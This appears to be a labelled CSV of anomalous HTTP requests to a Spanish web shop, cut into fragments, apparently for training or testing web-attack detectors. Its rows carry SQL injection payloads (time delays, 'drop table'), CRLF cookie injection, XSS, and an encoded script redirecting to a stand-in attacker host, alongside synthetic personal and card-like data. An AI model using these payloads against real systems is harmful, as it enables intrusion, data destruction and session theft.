request,label
"prestancia nombre dip apellidos miravet leserre email bois@awat.vi dni 49100388b direccion c/ maestro macias, 77, 3c ciudad peï¿½as de san pedro cp 46838 provincia lleida ntc 8266692511685831 b1 registrar"" ""modo",1
"registro login """" and """"1"""" """"1 password prestancia nombre dip apellidos miravet leserre email bois@awat.vi dni 49100388b direccion c/ maestro macias, 77, 3c ciudad peï¿½as de san pedro cp 46838 provincia lleida ntc",1
"8266692511685831 b1 registrar"" ""modo registro login """" and """"1"""" """"1 password prestancia nombre dip apellidos miravet leserre email bois@awat.vi dni 49100388b direccion c/ maestro macias, 77, 3c ciudad peï¿½as de",1
"san pedro cp 46838 provincia lleida ntc 8266692511685831 b1 registrar"" ""modo registro login lotfalia password prestancia nombre dip apellidos miravet leserre email bois@awat.vi dni 49100388b direccion c/ maestro",1
"macias, 77, 3c ciudad v.istabella del m.aes?trazgo cp 46838 provincia lleida ntc 8266692511685831 b1 registrar"" ""modo registro login lotfalia password prestancia nombre dip apellidos miravet leserre email bois@awat.vi",1
"dni 49100388b direccion c/ maestro macias, 77, 3c ciudad v.istabella del m.aes?trazgo cp 46838 provincia lleida ntc 8266692511685831 b1 registrar"" ""modo registro login lotfalia password prestancia nombrea dip apellidos",1
"miravet leserre email bois@awat.vi dni 49100388b direccion c/ maestro macias, 77, 3c ciudad peï¿½as de san pedro cp 46838 provincia lleida ntc 8266692511685831 b1 registrar"" ""modo registro login lotfalia password",1
"prestancia nombrea dip apellidos miravet leserre email bois@awat.vi dni 49100388b direccion c/ maestro macias, 77, 3c ciudad peï¿½as de san pedro cp 46838 provincia lleida ntc 8266692511685831 b1 registrar"" b2a",1
"vaciar carrito b2a vaciar carrito ""modo 'or'a 'a login onfre password $huaico nombre stella apellidos botella email pescard_praeger@hipereuskadi.ms dni 34934492e direccion aguamarina 92, 6f ciudad albalï¿½ cp 42351",1
"provincia leï¿½n ntc 0340155501114760 b1 registrar"" ""modo 'or'a 'a login onfre password $huaico nombre stella apellidos botella email pescard_praeger@hipereuskadi.ms dni 34934492e direccion aguamarina 92, 6f",1
"ciudad albalï¿½ cp 42351 provincia leï¿½n ntc 0340155501114760 b1 registrar"" ""modo registro logina onfre password $huaico nombre stella apellidos botella email pescard_praeger@hipereuskadi.ms dni 34934492e",1
"direccion aguamarina 92, 6f ciudad albalï¿½ cp 42351 provincia leï¿½n ntc 0340155501114760 b1 registrar"" ""modo registro logina onfre password $huaico nombre stella apellidos botella email",1
"pescard_praeger@hipereuskadi.ms dni 34934492e direccion aguamarina 92, 6f ciudad albalï¿½ cp 42351 provincia leï¿½n ntc 0340155501114760 b1 registrar"" id 2 nombre queso manchego precio 100 cantidad 64 b1",1
aï¿½adir al carrito');waitfor delay '0:0:15';-- id 2 nombre queso manchego precio 100 cantidad 64 b1 aï¿½adir al carrito');waitfor delay '0:0:15';-- id any%3f%0d%0aset-cookie%3a tamper%3d1041264011025374727 nombre,1
queso manchego precio 100 cantidad 64 b1 aï¿½adir al carrito id any%3f%0d%0aset-cookie%3a tamper%3d1041264011025374727 nombre queso manchego precio 100 cantidad 64 b1 aï¿½adir al carrito id 2 nombre,1
queso manchego precio 85/ cantidad 64 b1 aï¿½adir al carrito id 2 nombre queso manchego precio 85/ cantidad 64 b1 aï¿½adir al carrito id 2 nombre queso manchego precio 100 cantidad 64 b1a aï¿½adir al carrito id 2,1
nombre queso manchego precio 100 cantidad 64 b1a aï¿½adir al carrito modo entrar login melfi pwd c8r4e9a remember on b1 entrar modo entrar login melfi pwd c8r4e9a remember %00 b1 entrar modo entrar login melfi,1
"pwd c8r4e9a remember %00 b1 entrar ""modo entrar login melfi pwd 5/2r47c,644e/ro remember on b1 entrar"" ""modo entrar login melfi pwd 5/2r47c,644e/ro remember on b1 entrar"" id %3f id %3f ida 1 ida 1 errormsg %2b",1
errormsg %2b errormsga credenciales incorrectas errormsga credenciales incorrectas modo insertar precio 5592 b1 confirmar/ modo insertar precio 5592 b1 confirmar/ modo insertar precio 5592 b1a confirmar modo,1
insertar precio 5592 b1a confirmar modo registro login shiranth5 password petal9192 nombre nelma apellidos rayo jalï¿½n email dubucourt-geoffrey@intercambioenlaces.name dni 75767112y direccion plaï¿½a d' espanya,1
36 6-e ciudad penagos cp sessionid 12312312 username provincia mï¿½laga ntc 1634165251818381 b1 registrar modo registro login shiranth5 password petal9192 nombre nelma apellidos rayo jalï¿½n email dubucourt-,1
geoffrey@intercambioenlaces.name dni 75767112y direccion plaï¿½a d' espanya 36 6-e ciudad penagos cp sessionid 12312312 username provincia mï¿½laga ntc 1634165251818381 b1 registrar modo registro login,1
shiranth5 password petal9192 nombre nelma apellidos rayo jalï¿½n email dubucourt-geoffrey@intercambioenlaces.name dni 7b0b624b341n direccion plaï¿½a d' espanya 36 6-e ciudad penagos cp 10240 provincia,1
mï¿½laga ntc 1634165251818381 b1 registrar modo registro login shiranth5 password petal9192 nombre nelma apellidos rayo jalï¿½n email dubucourt-geoffrey@intercambioenlaces.name dni 7b0b624b341n direccion,1
plaï¿½a d' espanya 36 6-e ciudad penagos cp 10240 provincia mï¿½laga ntc 1634165251818381 b1 registrar modoa registro login shiranth5 password petal9192 nombre nelma apellidos rayo jalï¿½n email dubucourt-,1
geoffrey@intercambioenlaces.name dni 75767112y direccion plaï¿½a d' espanya 36 6-e ciudad penagos cp 10240 provincia mï¿½laga ntc 1634165251818381 b1 registrar modoa registro login shiranth5 password,1
petal9192 nombre nelma apellidos rayo jalï¿½n email dubucourt-geoffrey@intercambioenlaces.name dni 75767112y direccion plaï¿½a d' espanya 36 6-e ciudad penagos cp 10240 provincia mï¿½laga ntc,1
1634165251818381 b1 registrar b2 vaciar carrito%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e b2 vaciar carrito%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e b2a vaciar carrito b2a,1
"vaciar carrito ""modo registro login alexi password cuerda nombre donardo apellidos paracoll','0');waitfor delay '0:0:15';-- email filho@encuentrodominios.is dni 01722111d direccion enric granados 137, ciudad ruesca cp",1
"47248 provincia alicante ntc 0825150389138142 b1 registrar"" ""modo registro login alexi password cuerda nombre donardo apellidos paracoll','0');waitfor delay '0:0:15';-- email filho@encuentrodominios.is dni 01722111d",1
"direccion enric granados 137, ciudad ruesca cp 47248 provincia alicante ntc 0825150389138142 b1 registrar"" ""modo any%3f%0aset-cookie%3a tamper%3d5765205567234876235 login alexi password cuerda nombre",1
"donardo apellidos paracoll email filho@encuentrodominios.is dni 01722111d direccion enric granados 137, ciudad ruesca cp 47248 provincia alicante ntc 0825150389138142 b1 registrar"" ""modo any%3f%0aset-cookie%3a",1
"tamper%3d5765205567234876235 login alexi password cuerda nombre donardo apellidos paracoll email filho@encuentrodominios.is dni 01722111d direccion enric granados 137, ciudad ruesca cp 47248 provincia",1
"alicante ntc 0825150389138142 b1 registrar"" id 2 nombre jamï¿½n ibï¿½rico'or'a 'a precio 85 cantidad 4 b1 aï¿½adir al carrito id 2 nombre jamï¿½n ibï¿½rico'or'a 'a precio 85 cantidad 4 b1 aï¿½adir al carrito id sessionid",1
12312312 username nombre jamï¿½n ibï¿½rico precio 85 cantidad 4 b1 aï¿½adir al carrito id sessionid 12312312 username nombre jamï¿½n ibï¿½rico precio 85 cantidad 4 b1 aï¿½adir al carrito id 2 nombre jamï¿½n,1
ibï¿½rico precio 85 cantidad 4 b1a aï¿½adir al carrito id 2 nombre jamï¿½n ibï¿½rico precio 85 cantidad 4 b1a aï¿½adir al carrito modo entrar@40 login blann pwd brear remember off b1 entrar modo entrar@40 login,1
blann pwd brear remember off b1 entrar modo entrar login blann pwd any%0aset-cookie%3a tamper%3d1041264011025374727 remember off b1 entrar modo entrar login blann pwd any%0aset-cookie%3a,1
tamper%3d1041264011025374727 remember off b1 entrar modo entrar login blann pwd 'fa3 remember off b1 entrar modo entrar login blann pwd 'fa3 remember off b1 entrar modo entrar login blann pwd brear remember,1
off b1a entrar modo entrar login blann pwd brear remember off b1a entrar id 1'; drop table usuarios; select * from datos where nombre like '% id 1'; drop table usuarios; select * from datos where nombre like '% id sessionid,1
12312312 username,1
%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%,1
%63%72%69%70%74%3e? id sessionid 12312312 username,1
%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%,1
"%63%72%69%70%74%3e? ida 1 ida 1 errormsga credenciales incorrectas errormsga credenciales incorrectas ""modo insertar precio 2373 b1 confirmar','0','0','0','0');waitfor delay '0:0:15';--"" ""modo insertar precio 2373 b1",1
"confirmar','0','0','0','0');waitfor delay '0:0:15';--"" modo insertar precio 2373 b1 pasar por caja/ modo insertar precio 2373 b1 pasar por caja/ modoa insertar precio 2373 b1 confirmar modoa insertar precio 2373 b1 confirmar",1
"""modo registro login jakeman password c0a428o nombre carolina apellidos pepiol acho email juergens-shear@imarbella.dm dni aa89470ap direccion vicent andreu estelles, 106 1?e ciudad mata de los olmos, la cp 20217",1
"provincia girona ntc 5088681295774264 b1 registrar"" ""modo registro login jakeman password c0a428o nombre carolina apellidos pepiol acho email juergens-shear@imarbella.dm dni aa89470ap direccion vicent andreu",1
"estelles, 106 1?e ciudad mata de los olmos, la cp 20217 provincia girona ntc 5088681295774264 b1 registrar"" ""modo registro login jakeman password c0a428o nombrea carolina apellidos pepiol acho email juergens-",1
"shear@imarbella.dm dni 13717151c direccion vicent andreu estelles, 106 1?e ciudad mata de los olmos, la cp 20217 provincia girona ntc 5088681295774264 b1 registrar"" ""modo registro login jakeman password c0a428o",1
"nombrea carolina apellidos pepiol acho email juergens-shear@imarbella.dm dni 13717151c direccion vicent andreu estelles, 106 1?e ciudad mata de los olmos, la cp 20217 provincia girona ntc 5088681295774264 b1",1
"registrar"" b2a vaciar carrito b2a vaciar carrito ""modo registro login maludzin password *hintero nombre isauro apellidos cï¿½zar ortega email knaup@ilusionarium.by dni 30143184m direccion cerro animas 199, 8?g ciudad",1
"bentarique cp 08270 provincia teruel ntc 5095373752411795 b1 registrar"" ""modo registro login maludzin password *hintero nombre isauroand 1 1 apellidos cï¿½zar ortega email knaup@ilusionarium.by dni 30143184m",1
"direccion cerro animas 199, 8?g ciudad bentarique cp 08270 provincia teruel ntc 5095373752411795 b1 registrar"" ""modo registro login maludzin password *hintero nombre isauroand 1 1 apellidos cï¿½zar ortega email",1
"knaup@ilusionarium.by dni 30143184m direccion cerro animas 199, 8?g ciudad bentarique cp 08270 provincia teruel ntc 5095373752411795 b1 registrar"" ""modo registro login maludzin password *hintero nombre isauro",1
"apellidos cï¿½zar ortega email knaup@ilusionarium.by dni 30143184m direccion cerro animas 199, 8?g ciudad l?anza?hï¿½?ta cp 08270 provincia teruel ntc 5095373752411795 b1 registrar"" ""modo registro login maludzin",1
"password *hintero nombre isauro apellidos cï¿½zar ortega email knaup@ilusionarium.by dni 30143184m direccion cerro animas 199, 8?g ciudad l?anza?hï¿½?ta cp 08270 provincia teruel ntc 5095373752411795 b1",1
"registrar"" ""modo registro login maludzin password *hintero nombre isauro apellidos cï¿½zar ortega email knaup@ilusionarium.by dnia 30143184m direccion cerro animas 199, 8?g ciudad bentarique cp 08270 provincia",1
"teruel ntc 5095373752411795 b1 registrar"" ""modo registro login maludzin password *hintero nombre isauro apellidos cï¿½zar ortega email knaup@ilusionarium.by dnia 30143184m direccion cerro animas 199, 8?g ciudad",1
"bentarique cp 08270 provincia teruel ntc 5095373752411795 b1 registrar"" id 1 nombre vino .*?rioja precio 39 cantidad 56 b1 aï¿½adir al carrito id 1 nombre vino .*?rioja precio 39 cantidad 56 b1 aï¿½adir al carrito id 1",1
nombre jamï¿½n ibï¿½rico precio 39 cantidada 56 b1 aï¿½adir al carrito id 1 nombre jamï¿½n ibï¿½rico precio 39 cantidada 56 b1 aï¿½adir al carrito modo login wingo1 pwd 1esm7n8h8r remember on b1 entrar modo,1
login wingo1 pwd 1esm7n8h8r remember on b1 entrar id 1'or'a 'a id 1'or'a 'a id any%3f%0d%0aset-cookie%3a tamper%3d1041264011025374727%0d%0a id any%3f%0d%0aset-cookie%3a,1
tamper%3d1041264011025374727%0d%0a errormsg credenciales incorrectas errormsga credenciales incorrectas errormsga credenciales incorrectas modo insertar precio 7384 b1 confirmar/ modo insertar precio 7384 b1,1
"confirmar/ ""modo registro login proulx password d1sme43z8r nombre crescencio apellidos bergï¿½ giralt email duch@in@@enmallorca.com.ki dni 42641360g direccion grupos jose antonio, 7 ciudad mozota cp 48640",1
"provincia cï¿½ceres ntc 7871877495462595 b1 registrar"" ""modo registro login proulx password d1sme43z8r nombre crescencio apellidos bergï¿½ giralt email duch@in@@enmallorca.com.ki dni 42641360g direccion",1
"grupos jose antonio, 7 ciudad mozota cp 48640 provincia cï¿½ceres ntc 7871877495462595 b1 registrar"" ""modo registro login proulx password d1sme43z8r nombre crescencio apellidos bergï¿½ giralt email",1
"sayles@nutrimama.fj dni 42641360g direcciona grupos jose antonio, 7 ciudad mozota cp 48640 provincia cï¿½ceres ntc 7871877495462595 b1 registrar"" ""modo registro login proulx password d1sme43z8r nombre",1
"crescencio apellidos bergï¿½ giralt email sayles@nutrimama.fj dni 42641360g direcciona grupos jose antonio, 7 ciudad mozota cp 48640 provincia cï¿½ceres ntc 7871877495462595 b1 registrar"" b2 set-cookie%3a",1
"tamper%3d1041264011025374727 b2 set-cookie%3a tamper%3d1041264011025374727 b2a vaciar carrito b2a vaciar carrito ""modo registro login mcminn password d8eci78e88a1a nombre adoraciï¿½n apellidos gorrias",1
"email rice-davies@somagel.mc dni 72553689m direccion plza. virgen del carmen 197, ciudad fresno de caracena cp 2872a provincia valladolid ntc 4132924847990257 b1 registrar"" ""modo registro login mcminn password",1
"d8eci78e88a1a nombre adoraciï¿½n apellidos gorrias email rice-davies@somagel.mc dni 72553689m direccion plza. virgen del carmen 197, ciudad fresno de caracena cp 2872a provincia valladolid ntc",1
"4132924847990257 b1 registrar"" ""modo registro login mcminn password d8eci78e88a1a nombre adoraciï¿½n apellidosa gorrias email rice-davies@somagel.mc dni 72553689m direccion plza. virgen del carmen 197,",1
"ciudad fresno de caracena cp 25191 provincia valladolid ntc 4132924847990257 b1 registrar"" ""modo registro login mcminn password d8eci78e88a1a nombre adoraciï¿½n apellidosa gorrias email rice-davies@somagel.mc",1
"dni 72553689m direccion plza. virgen del carmen 197, ciudad fresno de caracena cp 25191 provincia valladolid ntc 4132924847990257 b1 registrar"" id 2 nombre queso manchego precio 39 cantidad 52 b1 aï¿½adir al",1
carrito? id 2 nombre queso manchego precio 39 cantidad 52 b1 aï¿½adir al carrito? id 2 nombre ques o manchego precio 39 cantidad 52 b1 aï¿½adir al carrito id 2 nombre ques o manchego precio 39 cantidad 52 b1,1
aï¿½adir al carrito id 2 nombre queso manchego precio 39 cantidada 52 b1 aï¿½adir al carrito id 2 nombre queso manchego precio 39 cantidada 52 b1 aï¿½adir al carrito modo entrar login ginsberg pwd e23am!pa83r,1
remember onset-cookie%3a tamper%3d1041264011025374727 b1 entrar modo entrar login ginsberg pwd e23am!pa83r remember onset-cookie%3a tamper%3d1041264011025374727 b1 entrar modo entrar login,1
ginsberg pwd s33ler'1 remember on b1 entrar modo entrar login ginsberg pwd s33ler'1 remember on b1 entrar modo entrar logina ginsberg pwd e23am!pa83r remember on b1 entrar modo entrar logina ginsberg pwd,1
"e23am!pa83r remember on b1 entrar id 2'or'a 'a id 2'or'a 'a ida 2 ida 2 ""errormsg credenciales incorrectas','0');waitfor delay '0:0:15';--"" ""errormsg credenciales incorrectas','0');waitfor delay '0:0:15';--"" errormsg",1
